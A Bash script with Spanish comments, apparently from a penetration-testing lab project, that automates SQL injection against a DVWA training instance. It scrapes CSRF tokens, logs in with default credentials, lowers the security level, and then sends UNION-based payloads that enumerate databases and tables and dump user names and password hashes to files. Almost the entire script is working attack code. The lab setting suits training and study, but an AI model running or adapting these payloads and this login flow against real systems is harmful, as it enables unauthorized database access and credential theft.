#!/bin/bash
#
# ejecutar-sqli-fixed.sh - SQL Injection con CSRF token
#

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"
source "$SCRIPT_DIR/utils.sh"

TARGET_URL="${TARGET_URL:-http://localhost}"
DVWA_SESSION=""
COOKIE_FILE="/tmp/dvwa_cookies_sqli.txt"

# ============================================================================
# OBTENER SESIÓN CON CSRF TOKEN
# ============================================================================

get_dvwa_session() {
    info "Obteniendo sesión DVWA con CSRF token..."

    # Paso 1: Obtener la página de login para capturar el CSRF token
    local login_page=$(curl -s -c "$COOKIE_FILE" "$TARGET_URL/login.php")

    # Extraer user_token del HTML
    local user_token=$(echo "$login_page" | grep -oP "user_token' value='\K[^']+")

    if [ -z "$user_token" ]; then
        error "No se pudo obtener user_token"
        return 1
    fi

    log "CSRF token obtenido: ${user_token:0:10}..."

    # Paso 2: Hacer login con el token
    curl -s -L -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
        -d "username=admin" \
        -d "password=password" \
        -d "Login=Login" \
        -d "user_token=$user_token" \
        "$TARGET_URL/login.php" > /dev/null

    # Paso 3: Extraer PHPSESSID
    if [ -f "$COOKIE_FILE" ]; then
        DVWA_SESSION=$(grep PHPSESSID "$COOKIE_FILE" | awk '{print $7}')

        if [ -n "$DVWA_SESSION" ]; then
            log "Sesión obtenida: $DVWA_SESSION"

            # Paso 4: Configurar nivel de seguridad
            # Primero obtener el token de la página de seguridad
            local security_page=$(curl -s -L -b "$COOKIE_FILE" "$TARGET_URL/security.php")
            local security_token=$(echo "$security_page" | grep -oP "user_token' value='\K[^']+")

            if [ -n "$security_token" ]; then
                curl -s -L -b "$COOKIE_FILE" -c "$COOKIE_FILE" \
                    -d "security=low" \
                    -d "seclev_submit=Submit" \
                    -d "user_token=$security_token" \
                    "$TARGET_URL/security.php" > /dev/null

                log "Nivel de seguridad configurado a: low"
            fi

            # Paso 5: Verificar acceso a SQL Injection page
            local sqli_test=$(curl -s -L -b "$COOKIE_FILE" "$TARGET_URL/vulnerabilities/sqli/")

            if echo "$sqli_test" | grep -qi "SQL Injection"; then
                success "✓ Acceso a SQL Injection verificado"
                return 0
            else
                error "No se pudo acceder a la página SQL Injection"
                return 1
            fi
        else
            error "No se pudo obtener PHPSESSID"
            return 1
        fi
    else
        error "No se creó el archivo de cookies"
        return 1
    fi
}

# ============================================================================
# EXPLOTACIÓN SQL INJECTION
# ============================================================================

sqli_exploit() {
    show_banner "SQL Injection Exploitation" "MITRE ATT&CK: T1213"

    info "Iniciando explotación de SQL Injection..."
    echo ""

    # Crear directorio
    local sqli_dir="$PROJECT_ROOT/04-Explotacion/sqli-results"
    ensure_dir "$sqli_dir"

    # Test 1: Vulnerabilidad
    separator
    echo -e "${BLUE}[TEST 1/4]${NC} Verificando vulnerabilidad SQL Injection"
    separator
    echo ""

    local test_payload="1' OR '1'='1"
    local test_url="$TARGET_URL/vulnerabilities/sqli/?id=$test_payload&Submit=Submit"
    local test_result=$(curl -s -L -b "$COOKIE_FILE" "$test_url")

    # Contar "First name:" en la respuesta
    local test_count=$(echo "$test_result" | grep -i "First name:" | wc -l)

    if [ "$test_count" -gt 1 ]; then
        log "✓ SQL Injection VULNERABLE detectada ($test_count usuarios encontrados)"
        echo "$test_result" > "$sqli_dir/test-vulnerability.html"
    else
        error "No se detectó vulnerabilidad SQL Injection"
        warning "Resultados encontrados: $test_count"
        echo "$test_result" > "$sqli_dir/test-failed.html"
        return 1
    fi

    echo ""
    sleep 2

    # Test 2: Bases de datos
    separator
    echo -e "${BLUE}[TEST 2/4]${NC} Enumerando bases de datos"
    separator
    echo ""

    local db_payload="1' UNION SELECT NULL,schema_name FROM information_schema.schemata-- -"
    local db_url="$TARGET_URL/vulnerabilities/sqli/?id=$db_payload&Submit=Submit"
    local db_result=$(curl -s -L -b "$COOKIE_FILE" "$db_url")

    log "Bases de datos encontradas:"
    # Extraer surnames que contendrán los nombres de DB
    echo "$db_result" | grep -i "Surname:" | sed 's/.*Surname: \([^<]*\).*/  • \1/' | tee "$sqli_dir/databases.txt"

    echo ""
    sleep 2

    # Test 3: Tablas
    separator
    echo -e "${BLUE}[TEST 3/4]${NC} Enumerando tablas de 'dvwa'"
    separator
    echo ""

    local table_payload="1' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_schema='dvwa'-- -"
    local table_url="$TARGET_URL/vulnerabilities/sqli/?id=$table_payload&Submit=Submit"
    local table_result=$(curl -s -L -b "$COOKIE_FILE" "$table_url")

    log "Tablas encontradas:"
    echo "$table_result" | grep -i "Surname:" | sed 's/.*Surname: \([^<]*\).*/  • \1/' | tee "$sqli_dir/tables.txt"

    echo ""
    sleep 2

    # Test 4: Usuarios
    separator
    echo -e "${BLUE}[TEST 4/4]${NC} Extrayendo usuarios y passwords"
    separator
    echo ""

    local user_payload="1' UNION SELECT user,password FROM users-- -"
    local user_url="$TARGET_URL/vulnerabilities/sqli/?id=$user_payload&Submit=Submit"
    local user_result=$(curl -s -L -b "$COOKIE_FILE" "$user_url")

    # Guardar HTML completo
    echo "$user_result" > "$sqli_dir/users-dump-raw.html"

    # Crear archivo formateado
    local users_file="$sqli_dir/users-passwords.txt"
    {
        echo "# DVWA Users - SQL Injection Dump"
        echo "# Timestamp: $(date '+%Y-%m-%d %H:%M:%S')"
        echo "# MITRE ATT&CK: T1213"
        echo ""
        echo "Usuario              | Hash MD5"
        echo "---------------------+----------------------------------"
    } > "$users_file"

    log "Usuarios extraídos:"
    echo ""

    # Parsear usuarios del HTML
    echo "$user_result" | \
        grep -A1 "First name:" | \
        sed 'N;s/\n/ /' | \
        grep -oP 'First name: \K[^<]+.*Surname: [^<]+' | \
        sed 's/Surname:/|/' | \
        awk -F'|' '{printf "%-20s | %s\n", $1, $2}' | \
        tee -a "$users_file"

    echo ""

    # Resumen
    separator
    success "Explotación SQL Injection completada"
    separator
    echo ""

    info "Resultados guardados en:"
    echo "  📁 $sqli_dir/"
    echo "     • test-vulnerability.html"
    echo "     • databases.txt"
    echo "     • tables.txt"
    echo "     • users-passwords.txt ⭐"
    echo "     • users-dump-raw.html"
    echo ""

    # Captura automática
    info "Capturando evidencia..."
    bash "$SCRIPT_DIR/capture-evidence.sh" --screenshot exploit sqli "users-extraction" T1213 2>/dev/null || true
    log "Screenshot capturado"

    echo ""
    separator
    info "Próximos pasos:"
    separator
    echo ""
    echo "  1. cat $sqli_dir/users-passwords.txt"
    echo "  2. bash 07-Scripts/generar-informe.sh"
    echo ""

    return 0
}

# ============================================================================
# MAIN
# ============================================================================

main() {
    init_script "ejecutar-sqli-fixed.sh"

    echo ""
    info "Target: $TARGET_URL"
    echo ""

    # Verificar DVWA
    if ! curl -s --max-time 5 "$TARGET_URL" > /dev/null 2>&1; then
        error "DVWA no accesible en $TARGET_URL"
        exit 1
    fi

    # Obtener sesión
    if ! get_dvwa_session; then
        error "No se pudo obtener sesión"
        exit 1
    fi

    echo ""

    # Ejecutar explotación
    if sqli_exploit; then
        echo ""
        success "🎉 Explotación SQL Injection completada exitosamente"
        finish_script "ejecutar-sqli-fixed.sh"
        exit 0
    else
        error "Explotación falló"
        exit 1
    fi
}

# Ejecutar
if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main "$@"
fi
